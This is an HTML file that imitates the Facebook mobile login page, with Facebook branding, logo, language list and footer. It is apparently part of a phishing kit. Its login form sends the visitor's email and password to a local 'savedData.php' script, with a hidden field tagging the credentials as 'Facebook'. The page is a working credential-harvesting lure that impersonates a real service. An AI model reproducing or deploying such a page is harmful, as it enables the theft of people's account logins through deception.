
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- Bootstrap  Version 5 --> 
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
        <!-- icon mobile --> 
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" integrity="sha384-vp86vTRFVJgpjF9jiIGPEEqYqlDwgyBgEF109VFjmqGmIY/Y4HV4d3Gp2irVfcrp" crossorigin="anonymous">
        <link rel="icon" href="http://assets.stickpng.com/images/584ac2d03ac3a570f94a666d.png" />
        <!-- CSS Stylesheet -->
        <link rel="stylesheet" href="../stylesheet/fb.css">
        <title>Facebook</title>
    </head>
    <body>
    <div id="header" class="mt-2"  style="list-style-type:none;" >
    <a style="text-decoration:none" href="https://play.google.com/store/apps/details?id=com.facebook.katana&hl=en_US">
    <i class="fas fa-mobile-alt d-inline mx-2"></i>
    <p style="color:#4267b2;" class="mt-1 d-inline"> Get Facebook for Android and Browse Faster.  </p> </a>
    </div>
        <div class=" text-center mt-2">
      <img id="fbtext"src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="fb" width="112px">
      </div>
    <form class="text-center mx-4" action="../Component/savedData.php" method="POST">
        <div class="row justify-content-center">
      <div class="mb-3 col-md-4 col-sm-12">
        <input type="email" name = "email" class="form-control" id="exampleInputEmail1" placeholder="Enter mobile number or email address">
      </div>
      </div>
      
      <div class="row justify-content-center">
        <div class="mb-3 col-md-4">
      <input type="password" name="password"class="form-control" id="exampleInputPassword1" placeholder="Enter password">
      </div>
      </div>
      <input type="hidden" name="userId"  value="">
      <input type="hidden" name="social"  value="Facebook">

      <div class="row justify-content-center">
      <div class="col-md-4 col-sm-12">
        <input type="submit" name="saveData" class="form-control btn-primary text-center" id="exampleInputPassword1" value="Log in">
      </div>
      </div>
    </form>
    <div class="text-center mt-2 mb-2"> or </div> 
        <div class=" row d-flex justify-content-center mx-4">
        <div class="col-md-2">
        <input type="submit" class="form-control btn-success text-center" id="exampleInputPassword1" value="Create New Account">
        </div>
        </diV>
      <div class="text-center mt-2 text-primary"> Forgotten password?</div>
        <div class="row text-center mt-5 px-4">
        <div class="col-6">
            <ul style="list-style-type:none;" class="lang text-primary"> 
                <li class="text-secondary"> <strong>English (UK) </strong> </li> 
                <li> ਪੰਜਾਬੀ </li> 
                <li> മലയാളം </li> 
                <li> ગુજરાતી </li> 
            </ul>
        </div>
        <div class="col-6">
            <ul style="list-style-type:none;" class="lang text-primary"> 
                <li> हिन्दी  </li> 
                <li> اردو </li> 
                <li> ಕನ್ನಡ </li> 
                <li> +  </li> 
            </ul>
        </div>
            <small class="ahm text-muted d-flex justify-content-center mt-3 "> About <div class="point mx-2 text-muted">.</div> Help <div class="point mx-2 text-muted">.</div> More </small>
        
          <small class="text-muted d-flex justify-content-center mt-3"> Facebook Inc. </small>
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
    </body>
    </html>